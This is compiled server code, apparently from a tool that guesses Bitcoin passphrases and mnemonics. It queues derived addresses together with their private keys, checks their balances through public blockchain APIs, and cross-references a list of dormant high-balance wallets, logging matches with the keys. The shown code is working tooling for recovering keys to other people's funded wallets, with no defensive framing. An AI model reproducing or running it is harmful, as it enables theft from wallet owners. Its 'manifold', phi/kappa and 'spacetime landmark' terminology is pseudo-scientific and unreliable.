                console.log(`[BalanceQueue] API: cache=${apiStats.cacheSize} (${(apiStats.cacheHitRate * 100).toFixed(0)}% hit), providers=${apiStats.providers.filter((p) => p.healthy).length}/4 healthy`);
              } catch (logError) {
                console.error("[BalanceQueue] Error logging stats:", logError);
              }
            }
            return { checked: pending.length, hits };
          } catch (apiError) {
            console.error("[BalanceQueue] Bulk API error (will retry):", apiError);
            for (const item of pending) {
              item.status = "failed";
              item.retryCount++;
              item.error = apiError instanceof Error ? apiError.message : "Bulk API error";
            }
            return { checked: 0, hits: 0 };
          }
        } catch (outerError) {
          console.error("[BalanceQueue] CRITICAL: Catastrophic error in processBulkBatch (worker continues):", outerError);
          return { checked: 0, hits: 0 };
        }
      }
      /**
       * Get background worker status
       */
      getBackgroundStatus() {
        const elapsed = this.backgroundStartTime > 0 ? (Date.now() - this.backgroundStartTime) / 1e3 : 1;
        return {
          enabled: this.backgroundWorkerEnabled,
          checked: this.backgroundCheckCount,
          hits: this.backgroundHitCount,
          rate: this.backgroundCheckCount / elapsed,
          pending: Array.from(this.queue.values()).filter((i) => i.status === "pending").length,
          apiStats: freeBlockchainAPI.getStats()
        };
      }
      async loadFromDisk() {
        if (db) {
          try {
            const dbItems = await db.select().from(queuedAddresses).where(or3(
              eq5(queuedAddresses.status, "pending"),
              eq5(queuedAddresses.status, "failed"),
              eq5(queuedAddresses.status, "checking")
            )).limit(MAX_QUEUE_SIZE);
            for (const item of dbItems) {
              const queueItem = {
                id: item.id,
                address: item.address,
                passphrase: item.passphrase,
                wif: item.wif,
                isCompressed: item.isCompressed,
                cycleId: item.cycleId || void 0,
                source: item.source || "typescript",
                priority: item.priority,
                status: item.status === "checking" ? "pending" : item.status,
                queuedAt: item.queuedAt?.getTime() || Date.now(),
                checkedAt: item.checkedAt?.getTime(),
                retryCount: item.retryCount,
                error: item.error || void 0
              };
              this.queue.set(item.id, queueItem);
            }
            if (this.queue.size > 0) {
              console.log(`[BalanceQueue] Loaded ${this.queue.size} pending addresses from PostgreSQL`);
              return;
            }
          } catch (dbError) {
            console.log("[BalanceQueue] PostgreSQL load failed, trying JSON fallback:", dbError);
          }
        }
        try {
          const fs19 = await import("fs/promises");
          const data = await fs19.readFile(QUEUE_FILE, "utf-8");
          const saved = JSON.parse(data);
          for (const item of saved) {
            if (item.status === "checking") {
              item.status = "pending";
              item.retryCount = (item.retryCount || 0) + 1;
            }
            if (!item.source) {
              item.source = "typescript";
            }
            if (item.status === "pending" || item.status === "failed") {
              this.queue.set(item.id, item);
            }
          }
          console.log(`[BalanceQueue] Loaded ${this.queue.size} pending addresses from disk`);
          if (db && this.queue.size > 0) {
            console.log(`[BalanceQueue] Migrating ${this.queue.size} addresses to PostgreSQL...`);
            this.migrateToPostgres();
          }
        } catch {
          console.log("[BalanceQueue] No saved queue found, starting fresh");
        }
      }
      async migrateToPostgres() {
        if (!db) return;
        const items = Array.from(this.queue.values());
        let migrated = 0;
        for (const item of items) {
          try {
            await db.insert(queuedAddresses).values({
              id: item.id,
              address: item.address,
              passphrase: item.passphrase,
              wif: item.wif,
              isCompressed: item.isCompressed,
              cycleId: item.cycleId || null,
              source: item.source || "typescript",
              priority: item.priority,
              status: item.status,
              queuedAt: new Date(item.queuedAt),
              checkedAt: item.checkedAt ? new Date(item.checkedAt) : null,
              retryCount: item.retryCount,
              error: item.error || null
            }).onConflictDoNothing();
            migrated++;
          } catch (error) {
          }
        }
        console.log(`[BalanceQueue] Migrated ${migrated}/${items.length} addresses to PostgreSQL`);
      }
      async saveToDisk() {
        const toSave = Array.from(this.queue.values()).filter(
          (item) => item.status === "pending" || item.status === "failed"
        );
        if (db) {
          const itemsToSave = toSave.slice(0, 100);
          await withDbRetry(
            async () => {
              for (const item of itemsToSave) {
                await db.insert(queuedAddresses).values({
                  id: item.id,
                  address: item.address,
                  passphrase: item.passphrase,
                  wif: item.wif,
                  isCompressed: item.isCompressed,
                  cycleId: item.cycleId || null,
                  source: item.source || "typescript",
                  priority: item.priority,
                  status: item.status,
                  queuedAt: new Date(item.queuedAt),
                  checkedAt: item.checkedAt ? new Date(item.checkedAt) : null,
                  retryCount: item.retryCount,
                  error: item.error || null
                }).onConflictDoUpdate({
                  target: queuedAddresses.id,
                  set: {
                    status: sql4`EXCLUDED.status`,
                    priority: sql4`EXCLUDED.priority`,
                    retryCount: sql4`EXCLUDED.retry_count`,
                    error: sql4`EXCLUDED.error`
                  }
                });
              }
              return itemsToSave.length;
            },
            "BalanceQueue.saveToDisk",
            3
          );
        }
        try {
          const fs19 = await import("fs/promises");
          await fs19.mkdir("data", { recursive: true });
          await fs19.writeFile(QUEUE_FILE, JSON.stringify(toSave, null, 2));
        } catch (error) {
          console.error("[BalanceQueue] Error saving to disk:", error);
        }
      }
      async removeFromDb(id) {
        if (!db) return;
        await withDbRetry(
          async () => {
            await db.delete(queuedAddresses).where(eq5(queuedAddresses.id, id));
            return true;
          },
          "BalanceQueue.removeFromDb",
          2
        );
      }
      scheduleSave() {
        if (this.saveTimeout) {
          clearTimeout(this.saveTimeout);
        }
        this.saveTimeout = setTimeout(() => {
          this.saveToDisk();
        }, 5e3);
      }
      generateId(address, passphrase) {
        return `${address}-${Buffer.from(passphrase).toString("base64").slice(0, 20)}`;
      }
      /**
       * Queue an address for balance checking
       * Called by OceanAgent for EVERY generated address
       */
      enqueue(address, passphrase, wif, isCompressed, options) {
        const id = this.generateId(address, passphrase);
        const newPriority = options?.priority || 1;
        const source = options?.source || "typescript";
        if (this.queue.has(id)) {
          const existing = this.queue.get(id);
          if (newPriority > existing.priority && existing.status === "pending") {
            const oldPriority = existing.priority;
            existing.priority = newPriority;
            this.scheduleSave();
            if (newPriority >= 8) {
              console.log(`[BalanceQueue] \u{1F53A} Priority UPGRADED: ${address.substring(0, 12)}... ${oldPriority} \u2192 ${newPriority}`);
            }
            return true;
          }
          return false;
        }
        if (this.queue.size >= MAX_QUEUE_SIZE) {
          const pending = Array.from(this.queue.values()).filter((item2) => item2.status === "pending").sort((a, b) => a.priority - b.priority);
          if (pending.length > 0 && newPriority > pending[0].priority) {
            this.queue.delete(pending[0].id);
          } else {
            return false;
          }
        }
        const item = {
          id,
          address,
          passphrase,
          wif,
          isCompressed,
          cycleId: options?.cycleId,
          source,
          priority: newPriority,
          status: "pending",
          queuedAt: Date.now(),
          retryCount: 0
        };
        this.queue.set(id, item);
        this.scheduleSave();
        if (!this.backgroundWorkerInterval && this.backgroundWorkerEnabled) {
          this.startBackgroundWorker();
        }
        return true;
      }
      /**
       * Queue both compressed and uncompressed addresses for a passphrase
       */
      enqueueBoth(compressedAddr, uncompressedAddr, passphrase, compressedWif, uncompressedWif, options) {
        const compressed = this.enqueue(compressedAddr, passphrase, compressedWif, true, options);
        let uncompressed = false;
        if (uncompressedAddr && uncompressedAddr !== compressedAddr) {
          uncompressed = this.enqueue(uncompressedAddr, passphrase, uncompressedWif, false, options);
        }
        return { compressed, uncompressed };
      }
      refillTokens() {
        const now = Date.now();
        const elapsed = (now - this.tokenBucket.lastRefill) / 1e3;
        const tokensToAdd = elapsed * this.tokenBucket.refillRate;
        this.tokenBucket.tokens = Math.min(
          this.tokenBucket.maxTokens,
          this.tokenBucket.tokens + tokensToAdd
        );
        this.tokenBucket.lastRefill = now;
      }
      async consumeToken() {
        this.refillTokens();
        if (this.tokenBucket.tokens >= 1) {
          this.tokenBucket.tokens -= 1;
          return true;
        }
        const waitTime = (1 - this.tokenBucket.tokens) / this.tokenBucket.refillRate * 1e3;
        await new Promise((resolve) => setTimeout(resolve, waitTime));
        this.refillTokens();
        if (this.tokenBucket.tokens >= 1) {
          this.tokenBucket.tokens -= 1;
          return true;
        }
        return false;
      }
      /**
       * Check a single address with rate limiting
       */
      async checkAddress(item) {
        const canProceed = await this.consumeToken();
        if (!canProceed) {
          return false;
        }
        item.status = "checking";
        try {
          const hit = await checkAndRecordBalance(
            item.address,
            item.passphrase,
            item.wif,
            item.isCompressed
          );
          item.status = "resolved";
          item.checkedAt = Date.now();
          return hit !== null;
        } catch (error) {
          item.status = "failed";
          item.retryCount++;
          item.error = error instanceof Error ? error.message : "Unknown error";
          return false;
        }
      }
      /**
       * Drain the queue - process all pending addresses with rate limiting
       */
      async drain(options) {
        if (this.isProcessing) {
          console.log("[BalanceQueue] Already processing, skipping drain");
          return { checked: 0, hits: 0, errors: 0, duration: 0 };
        }
        this.isProcessing = true;
        this.processStartTime = Date.now();
        this.processedCount = 0;
        const pending = Array.from(this.queue.values()).filter((item) => item.status === "pending" || item.status === "failed" && item.retryCount < 3).sort((a, b) => b.priority - a.priority);
        const maxToProcess = options?.maxAddresses || pending.length;
        const toProcess = pending.slice(0, maxToProcess);
        console.log(`[BalanceQueue] Starting drain: ${toProcess.length} addresses to check`);
        let checked = 0;
        let hits = 0;
        let errors = 0;
        for (let i = 0; i < toProcess.length; i++) {
          const item = toProcess[i];
          if (options?.onProgress) {
            options.onProgress(i + 1, toProcess.length, item.address);
          }
          try {
            const isHit = await this.checkAddress(item);
            checked++;
            this.processedCount++;
            if (isHit) {
              hits++;
            }
            if (item.status === "resolved") {
              this.queue.delete(item.id);
            }
          } catch (error) {
            errors++;
            console.error(`[BalanceQueue] Error checking ${item.address}:`, error);
          }
        }
        const duration = Date.now() - this.processStartTime;
        console.log(`[BalanceQueue] Drain complete:`);
        console.log(`   Checked: ${checked}, Hits: ${hits}, Errors: ${errors}`);
        console.log(`   Duration: ${(duration / 1e3).toFixed(1)}s`);
        console.log(`   Rate: ${(checked / (duration / 1e3)).toFixed(2)} addr/sec`);
        await this.saveToDisk();
        this.isProcessing = false;
        if (this.onDrainComplete) {
          this.onDrainComplete({ checked, hits, errors });
        }
        return { checked, hits, errors, duration };
      }
      /**
       * Set callback for drain completion
       */
      setOnDrainComplete(callback) {
        this.onDrainComplete = callback;
      }
      /**
       * Get current queue statistics
       */
      getStats() {
        let pending = 0;
        let checking = 0;
        let resolved = 0;
        let failed = 0;
        const items = Array.from(this.queue.values());
        for (const item of items) {
          switch (item.status) {
            case "pending":
              pending++;
              break;
            case "checking":
              checking++;
              break;
            case "resolved":
              resolved++;
              break;
            case "failed":
              failed++;
              break;
          }
        }
        const duration = this.processStartTime > 0 ? (Date.now() - this.processStartTime) / 1e3 : 1;
        return {
          pending,
          checking,
          resolved,
          failed,
          total: this.queue.size,
          addressesPerSecond: this.processedCount / duration,
          lastDrainTime: this.processStartTime > 0 ? this.processStartTime : void 0
        };
      }
      /**
       * Get pending addresses for batch checking
       */
      getPendingAddresses(limit = 100) {
        return Array.from(this.queue.values()).filter((item) => item.status === "pending").sort((a, b) => b.priority - a.priority).slice(0, limit).map((item) => item.address);
      }
      /**
       * Mark addresses as checked (for batch operations)
       */
      markChecked(addresses2, results) {
        const queueItems = Array.from(this.queue.values());
        for (const item of queueItems) {
          if (addresses2.includes(item.address)) {
            const result = results.get(item.address);
            if (result) {
              item.status = "resolved";
              item.checkedAt = Date.now();
              if (result.balance > 0 || result.txCount > 0) {
                checkAndRecordBalance(item.address, item.passphrase, item.wif, item.isCompressed).catch(() => {
                });
              }
            }
          }
        }
        const entries = Array.from(this.queue.entries());
        for (const [id, item] of entries) {
          if (item.status === "resolved") {
            this.queue.delete(id);
          }
        }
        this.scheduleSave();
      }
      /**
       * Check if processing is in progress
       */
      isWorkerRunning() {
        return this.isProcessing;
      }
      /**
       * Set rate limit (requests per second)
       */
      setRateLimit(requestsPerSecond) {
        this.tokenBucket.refillRate = Math.max(0.1, Math.min(10, requestsPerSecond));
        console.log(`[BalanceQueue] Rate limit set to ${this.tokenBucket.refillRate} req/sec`);
      }
      /**
       * Clear all failed items (for retry with fresh state)
       */
      clearFailed() {
        let cleared = 0;
        const entries = Array.from(this.queue.entries());
        for (const [id, item] of entries) {
          if (item.status === "failed") {
            this.queue.delete(id);
            cleared++;
          }
        }
        this.scheduleSave();
        return cleared;
      }
      /**
       * Get queue size
       */
      size() {
        return this.queue.size;
      }
      /**
       * Clear entire queue
       */
      clear() {
        this.queue.clear();
        this.saveToDisk();
      }
    };
    balanceQueue = new BalanceQueueService();
  }
});

// server/mnemonic-wallet.ts
function generateBIP44ReceivePath(index2, account = 0) {
  return `m/44'/0'/${account}'/0/${index2}`;
}
function generateBIP44ChangePath(index2, account = 0) {
  return `m/44'/0'/${account}'/1/${index2}`;
}
function generateLegacyPath(index2) {
  return `m/0/${index2}`;
}
function deriveAddressWithKeys(mnemonic, path20, index2, pathType) {
  const privateKeyHex = deriveBIP32PrivateKey(mnemonic, path20);
  const addressCompressed = generateBitcoinAddressFromPrivateKey(privateKeyHex, true);
  generateBitcoinAddressFromPrivateKey(privateKeyHex, false);
  const privateKeyWIF = privateKeyToWIF(privateKeyHex, false);
  const privateKeyWIFCompressed = privateKeyToWIF(privateKeyHex, true);
  return {
    address: addressCompressed,
    // Primary address (compressed)
    derivationPath: path20,
    privateKeyHex,
    privateKeyWIF,
    privateKeyWIFCompressed,
    index: index2,
    pathType
  };
}
function deriveMnemonicAddresses(mnemonic, options) {
  const startTime2 = Date.now();
  if (!mnemonic || typeof mnemonic !== "string") {
    return {
      mnemonic: mnemonic || "",
      isValidBIP39: false,
      addresses: [],
      totalDerived: 0,
      derivationTime: Date.now() - startTime2
    };
  }
  const trimmedMnemonic = mnemonic.trim();
  const isValidBIP39 = isValidBIP39Phrase(trimmedMnemonic);
  const bip44ReceiveCount = options?.bip44ReceiveCount ?? DERIVATION_PATHS.BIP44_RECEIVE_COUNT;
  const bip44ChangeCount = options?.bip44ChangeCount ?? DERIVATION_PATHS.BIP44_CHANGE_COUNT;
  const accountCount = options?.accountCount ?? DERIVATION_PATHS.BIP44_ACCOUNT_COUNT;
  const legacyCount = options?.legacyCount ?? DERIVATION_PATHS.LEGACY_COUNT;
  const addresses2 = [];
  try {
    for (let account = 0; account < accountCount; account++) {
      for (let i = 0; i < bip44ReceiveCount; i++) {
        const path20 = generateBIP44ReceivePath(i, account);
        addresses2.push(deriveAddressWithKeys(trimmedMnemonic, path20, i, "bip44-receive"));
      }
      for (let i = 0; i < bip44ChangeCount; i++) {
        const path20 = generateBIP44ChangePath(i, account);
        addresses2.push(deriveAddressWithKeys(trimmedMnemonic, path20, i, "bip44-change"));
      }
    }
    for (let i = 0; i < legacyCount; i++) {
      const path20 = generateLegacyPath(i);
      addresses2.push(deriveAddressWithKeys(trimmedMnemonic, path20, i, "legacy"));
    }
  } catch (error) {
    console.error("[MnemonicWallet] Error deriving addresses:", error);
  }
  return {
    mnemonic: trimmedMnemonic,
    isValidBIP39,
    addresses: addresses2,
    totalDerived: addresses2.length,
    derivationTime: Date.now() - startTime2
  };
}
function checkMnemonicAgainstDormant(mnemonic) {
  const startTime2 = Date.now();
  if (!mnemonic || typeof mnemonic !== "string") {
    return {
      mnemonic: mnemonic || "",
      isValidBIP39: false,
      totalAddressesChecked: 0,
      matches: [],
      hasMatch: false,
      checkTime: Date.now() - startTime2
    };
  }
  const derivationResult = deriveMnemonicAddresses(mnemonic);
  const matches = [];
  for (const derived of derivationResult.addresses) {
    if (dormantCrossRef.isKnownDormant(derived.address)) {
      const dormantInfo = dormantCrossRef.getInfo(derived.address);
      if (dormantInfo) {
        matches.push({
          mnemonic: derivationResult.mnemonic,
          address: derived.address,
          derivationPath: derived.derivationPath,
          privateKeyHex: derived.privateKeyHex,
          privateKeyWIF: derived.privateKeyWIF,
          privateKeyWIFCompressed: derived.privateKeyWIFCompressed,
          pathType: derived.pathType,
          dormantInfo
        });
        console.log(`[MnemonicWallet] \u{1F3AF} DORMANT MATCH FOUND!`);
        console.log(`[MnemonicWallet]   Mnemonic: ${mnemonic.substring(0, 30)}...`);
        console.log(`[MnemonicWallet]   Address: ${derived.address}`);
        console.log(`[MnemonicWallet]   Path: ${derived.derivationPath}`);
        console.log(`[MnemonicWallet]   Balance: ${dormantInfo.balanceBTC} BTC`);
        console.log(`[MnemonicWallet]   Rank: #${dormantInfo.rank}`);
      }
    }
  }
  return {
    mnemonic: derivationResult.mnemonic,
    isValidBIP39: derivationResult.isValidBIP39,
    totalAddressesChecked: derivationResult.totalDerived,
    matches,
    hasMatch: matches.length > 0,
    checkTime: Date.now() - startTime2
  };
}
var DERIVATION_PATHS;
var init_mnemonic_wallet = __esm({
  "server/mnemonic-wallet.ts"() {
    "use strict";
    init_crypto();
    init_dormant_cross_ref();
    init_bip39_words();
    DERIVATION_PATHS = {
      BIP44_RECEIVE_COUNT: 20,
      BIP44_CHANGE_COUNT: 10,
      // Additional accounts for multi-account wallets
      BIP44_ACCOUNT_COUNT: 3,
      // Legacy paths (pre-BIP44) used by early wallets
      LEGACY_COUNT: 10,
      // BIP49 (P2SH-P2WPKH) SegWit compatibility  
      BIP49_COUNT: 10,
      // BIP84 (P2WPKH) Native SegWit
      BIP84_COUNT: 10
    };
  }
});

// server/ocean/ocean-persistence.ts
import { eq as eq6, and as and4, gte as gte2, lte as lte2, desc as desc4, asc as asc3, sql as sql5, inArray as inArray2 } from "drizzle-orm";
import * as crypto from "crypto";
var OceanPersistence, oceanPersistence;
var init_ocean_persistence = __esm({
  "server/ocean/ocean-persistence.ts"() {
    "use strict";
    init_db();
    init_schema();
    OceanPersistence = class {
      isAvailable;
      // Batching system for markTested to prevent connection pool exhaustion
      testedPhraseBuffer = /* @__PURE__ */ new Set();
      // Use Set for deduplication
      BATCH_SIZE = 100;
      flushTimer = null;
      FLUSH_INTERVAL_MS = 5e3;
      // Flush every 5 seconds if not full
      isFlushingTested = false;
      consecutiveFailures = 0;
      MAX_CONSECUTIVE_FAILURES = 10;
      constructor() {
        this.isAvailable = db !== null;
        if (this.isAvailable) {
          console.log("[OceanPersistence] PostgreSQL persistence enabled");
        } else {
          console.log("[OceanPersistence] Database not available - using in-memory fallback");
        }
        this.startFlushTimer();
        process.on("beforeExit", () => this.shutdown());
        process.on("SIGINT", () => this.shutdown());
        process.on("SIGTERM", () => this.shutdown());
      }
      /**
       * Graceful shutdown - flush all pending data
       */
      async shutdown() {
        if (this.flushTimer) {
          clearInterval(this.flushTimer);
          this.flushTimer = null;
        }
        if (this.testedPhraseBuffer.size > 0) {
          console.log(`[OceanPersistence] Shutdown: flushing ${this.testedPhraseBuffer.size} pending phrases...`);
          await this.flushTestedPhrases();
        }
      }
      /**
       * Start the periodic flush timer for tested phrases
       */
      startFlushTimer() {
        if (this.flushTimer) clearInterval(this.flushTimer);
        this.flushTimer = setInterval(() => {
          this.flushTestedPhrases().catch((err) => {
            console.error("[OceanPersistence] Periodic flush error:", err);
          });
        }, this.FLUSH_INTERVAL_MS);
      }
      /**
       * Flush all buffered tested phrases to the database with retry logic
       */
      async flushTestedPhrases() {
        if (this.testedPhraseBuffer.size === 0 || this.isFlushingTested) return 0;
        if (this.consecutiveFailures >= this.MAX_CONSECUTIVE_FAILURES) {
          console.warn("[OceanPersistence] Too many consecutive failures, waiting for next cycle");
          return 0;
        }
        this.isFlushingTested = true;
        const toFlush = Array.from(this.testedPhraseBuffer);
        this.testedPhraseBuffer.clear();
        let retries = 3;
        let delay = 100;
        const maxDelay = 2e3;
        while (retries > 0) {
          try {
            const count = await this.batchMarkTestedDirect(toFlush);
            this.isFlushingTested = false;
            this.consecutiveFailures = 0;
            return count;
          } catch (error) {
            retries--;
            if (retries === 0) {
              this.consecutiveFailures++;
              console.error(`[OceanPersistence] Failed to flush ${toFlush.length} phrases after 3 retries (consecutive failures: ${this.consecutiveFailures}):`, error.message);
              toFlush.forEach((p) => this.testedPhraseBuffer.add(p));
              this.isFlushingTested = false;
              return 0;
            }
            console.log(`[OceanPersistence] Flush retry in ${delay}ms (${retries} left)`);
            await new Promise((resolve) => setTimeout(resolve, delay));
            delay = Math.min(delay * 2, maxDelay);
          }
        }
        this.isFlushingTested = false;
        return 0;
      }
      /**
       * Internal direct batch write (no buffering)
       */
      async batchMarkTestedDirect(phrases) {
        if (!db || phrases.length === 0) return 0;
        const uniquePhrases = Array.from(new Set(phrases));
        const uniqueHashes = uniquePhrases.map((p) => ({
          phraseHash: crypto.createHash("sha256").update(p).digest("hex")
        }));
        await db.insert(testedPhrasesIndex).values(uniqueHashes).onConflictDoNothing();
        return uniqueHashes.length;
      }
      /**
       * Check if persistence is available
       */
      isPersistenceAvailable() {
        return this.isAvailable;
      }
      // ============================================================================
      // MANIFOLD PROBES - Geometric memory points on the QIG manifold
      // ============================================================================
      /**
       * Insert a batch of manifold probes efficiently
       * Used during investigation cycles (50+ probes per cycle)
       * Uses chunking to prevent timeout on large batches
       */
      async insertProbes(probes) {
        if (!db || probes.length === 0) return 0;
        const CHUNK_SIZE = 100;
        let totalInserted = 0;
        try {
          for (let i = 0; i < probes.length; i += CHUNK_SIZE) {
            const chunk = probes.slice(i, i + CHUNK_SIZE);
            const records = chunk.map((p) => ({
              id: p.id,
              input: p.input,
              coordinates: p.coordinates,
              phi: p.phi,
              kappa: p.kappa,
              regime: p.regime,
              ricciScalar: p.ricciScalar ?? 0,
              fisherTrace: p.fisherTrace ?? 0,
              source: p.source
            }));
            try {
              await db.insert(manifoldProbes).values(records).onConflictDoNothing();
              totalInserted += chunk.length;
            } catch (chunkError) {
              console.warn(`[OceanPersistence] Chunk ${i / CHUNK_SIZE} failed, continuing...`);
            }
            if (i + CHUNK_SIZE < probes.length) {
              await new Promise((resolve) => setTimeout(resolve, 10));
            }
          }
          return totalInserted;
        } catch (error) {
          console.error("[OceanPersistence] Failed to insert probes:", error);
          return totalInserted;
        }
      }
      /**
       * Query probes by φ/κ range
       * Optimized for geometric navigation
       */
      async queryProbesByPhiKappa(range, limit = 100) {
        if (!db) return [];
        try {
          const conditions = [];
          if (range.phiMin !== void 0) conditions.push(gte2(manifoldProbes.phi, range.phiMin));
          if (range.phiMax !== void 0) conditions.push(lte2(manifoldProbes.phi, range.phiMax));
          if (range.kappaMin !== void 0) conditions.push(gte2(manifoldProbes.kappa, range.kappaMin));
          if (range.kappaMax !== void 0) conditions.push(lte2(manifoldProbes.kappa, range.kappaMax));
          const query = conditions.length > 0 ? db.select().from(manifoldProbes).where(and4(...conditions)) : db.select().from(manifoldProbes);
          return await query.orderBy(desc4(manifoldProbes.phi)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to query probes:", error);
          return [];
        }
      }
      /**
       * Query probes by regime
       */
      async queryProbesByRegime(regime, limit = 100) {
        if (!db) return [];
        try {
          return await db.select().from(manifoldProbes).where(eq6(manifoldProbes.regime, regime)).orderBy(desc4(manifoldProbes.phi)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to query probes by regime:", error);
          return [];
        }
      }
      /**
       * Get high-Φ probes (resonant points)
       */
      async getHighPhiProbes(minPhi = 0.75, limit = 100) {
        if (!db) return [];
        try {
          return await db.select().from(manifoldProbes).where(gte2(manifoldProbes.phi, minPhi)).orderBy(desc4(manifoldProbes.phi)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get high-\u03A6 probes:", error);
          return [];
        }
      }
      /**
       * Get total probe count
       */
      async getProbeCount() {
        if (!db) return 0;
        try {
          const result = await db.select({ count: sql5`count(*)` }).from(manifoldProbes);
          return Number(result[0]?.count ?? 0);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get probe count:", error);
          return 0;
        }
      }
      /**
       * Get probes by IDs
       */
      async getProbesByIds(ids) {
        if (!db || ids.length === 0) return [];
        try {
          return await db.select().from(manifoldProbes).where(inArray2(manifoldProbes.id, ids));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get probes by IDs:", error);
          return [];
        }
      }
      // ============================================================================
      // RESONANCE POINTS - High-Φ clusters on the manifold
      // ============================================================================
      /**
       * Insert a resonance point
       */
      async insertResonancePoint(point) {
        if (!db) return false;
        try {
          await db.insert(resonancePoints).values({
            id: point.id,
            probeId: point.probeId,
            phi: point.phi,
            kappa: point.kappa,
            nearbyProbes: point.nearbyProbes,
            clusterStrength: point.clusterStrength
          }).onConflictDoNothing();
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to insert resonance point:", error);
          return false;
        }
      }
      /**
       * Get all resonance points
       */
      async getResonancePoints(limit = 100) {
        if (!db) return [];
        try {
          return await db.select().from(resonancePoints).orderBy(desc4(resonancePoints.clusterStrength)).limit(limit);
        } catch (error) {
          console.error("[OceanPersistence] Failed to get resonance points:", error);
          return [];
        }
      }
      // ============================================================================
      // REGIME BOUNDARIES - Transitions between regimes
      // ============================================================================
      /**
       * Insert a regime boundary
       */
      async insertRegimeBoundary(boundary) {
        if (!db) return false;
        try {
          await db.insert(regimeBoundaries).values(boundary).onConflictDoNothing();
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to insert regime boundary:", error);
          return false;
        }
      }
      /**
       * Get regime boundaries
       */
      async getRegimeBoundaries(fromRegime, toRegime) {
        if (!db) return [];
        try {
          const conditions = [];
          if (fromRegime) conditions.push(eq6(regimeBoundaries.fromRegime, fromRegime));
          if (toRegime) conditions.push(eq6(regimeBoundaries.toRegime, toRegime));
          const query = conditions.length > 0 ? db.select().from(regimeBoundaries).where(and4(...conditions)) : db.select().from(regimeBoundaries);
          return await query.orderBy(desc4(regimeBoundaries.midpointPhi));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get regime boundaries:", error);
          return [];
        }
      }
      // ============================================================================
      // GEODESIC PATHS - Fisher-optimal paths between probes
      // ============================================================================
      /**
       * Insert a geodesic path
       */
      async insertGeodesicPath(path20) {
        if (!db) return false;
        try {
          await db.insert(geodesicPaths).values(path20).onConflictDoNothing();
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to insert geodesic path:", error);
          return false;
        }
      }
      // ============================================================================
      // TPS LANDMARKS - Fixed spacetime reference points
      // ============================================================================
      /**
       * Insert or update a TPS landmark
       */
      async upsertLandmark(landmark) {
        if (!db) return false;
        try {
          await db.insert(tpsLandmarks).values({
            eventId: landmark.eventId,
            description: landmark.description,
            era: landmark.era,
            spacetimeX: landmark.spacetimeX ?? 0,
            spacetimeY: landmark.spacetimeY ?? 0,
            spacetimeZ: landmark.spacetimeZ ?? 0,
            spacetimeT: landmark.spacetimeT,
            culturalCoords: landmark.culturalCoords,
            fisherSignature: landmark.fisherSignature,
            lightConePast: landmark.lightConePast,
            lightConeFuture: landmark.lightConeFuture
          }).onConflictDoUpdate({
            target: tpsLandmarks.eventId,
            set: {
              description: landmark.description,
              era: landmark.era,
              spacetimeX: landmark.spacetimeX ?? 0,
              spacetimeY: landmark.spacetimeY ?? 0,
              spacetimeZ: landmark.spacetimeZ ?? 0,
              spacetimeT: landmark.spacetimeT,
              culturalCoords: landmark.culturalCoords,
              fisherSignature: landmark.fisherSignature,
              lightConePast: landmark.lightConePast,
              lightConeFuture: landmark.lightConeFuture
            }
          });
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to upsert landmark:", error);
          return false;
        }
      }
      /**
       * Get all TPS landmarks
       */
      async getLandmarks() {
        if (!db) return [];
        try {
          return await db.select().from(tpsLandmarks).orderBy(asc3(tpsLandmarks.spacetimeT));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get landmarks:", error);
          return [];
        }
      }
      /**
       * Get landmarks by era
       */
      async getLandmarksByEra(era) {
        if (!db) return [];
        try {
          return await db.select().from(tpsLandmarks).where(eq6(tpsLandmarks.era, era)).orderBy(asc3(tpsLandmarks.spacetimeT));
        } catch (error) {
          console.error("[OceanPersistence] Failed to get landmarks by era:", error);
          return [];
        }
      }
      // ============================================================================
      // TPS GEODESIC PATHS - Computed paths between landmarks
      // ============================================================================
      /**
       * Insert a TPS geodesic path
       */
      async insertTpsGeodesicPath(path20) {
        if (!db) return false;
        try {
          await db.insert(tpsGeodesicPaths).values({
            id: path20.id,
            fromLandmark: path20.fromLandmark,
            toLandmark: path20.toLandmark,
            distance: path20.distance,
            waypoints: path20.waypoints,
            totalArcLength: path20.totalArcLength,
            avgCurvature: path20.avgCurvature,
            regimeTransitions: path20.regimeTransitions
          }).onConflictDoNothing();
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to insert TPS geodesic path:", error);
          return false;
        }
      }
      // ============================================================================
      // OCEAN TRAJECTORIES - Navigation trajectories
      // ============================================================================
      /**
       * Start a new trajectory
       */
      async startTrajectory(id, address) {
        if (!db) return false;
        const result = await withDbRetry(
          async () => {
            await db.insert(oceanTrajectories).values({
              id,
              address,
              status: "active"
            });
            return true;
          },
          "startTrajectory",
          3
        );
        return result ?? false;
      }
      /**
       * Record a waypoint on a trajectory
       */
      async recordWaypoint(trajectoryId, waypoint) {
        if (!db) return false;
        try {
          const waypointId = crypto.randomUUID().substring(0, 32);
          const trajectory = await db.select().from(oceanTrajectories).where(eq6(oceanTrajectories.id, trajectoryId)).limit(1);
          if (trajectory.length === 0) return false;
          const nextSequence = (trajectory[0].waypointCount ?? 0) + 1;
          await db.insert(oceanWaypoints).values({
            id: waypointId,
            trajectoryId,
            sequence: nextSequence,
            phi: waypoint.phi,
            kappa: waypoint.kappa,
            regime: waypoint.regime,
            basinCoords: waypoint.basinCoords,
            event: waypoint.event,
            details: waypoint.details
          });
          await db.update(oceanTrajectories).set({
            waypointCount: nextSequence,
            lastPhi: waypoint.phi,
            lastKappa: waypoint.kappa,
            updatedAt: /* @__PURE__ */ new Date()
          }).where(eq6(oceanTrajectories.id, trajectoryId));
          return true;
        } catch (error) {
          console.error("[OceanPersistence] Failed to record waypoint:", error);
          return false;
        }
      }
      /**
       * Complete a trajectory
       */
      async completeTrajectory(trajectoryId, result, stats2) {
        if (!db) return false;
        const opResult = await withDbRetry(
          async () => {
            const trajectory = await db.select().from(oceanTrajectories).where(eq6(oceanTrajectories.id, trajectoryId)).limit(1);
            if (trajectory.length === 0) return false;
            const startTime2 = trajectory[0].startTime;
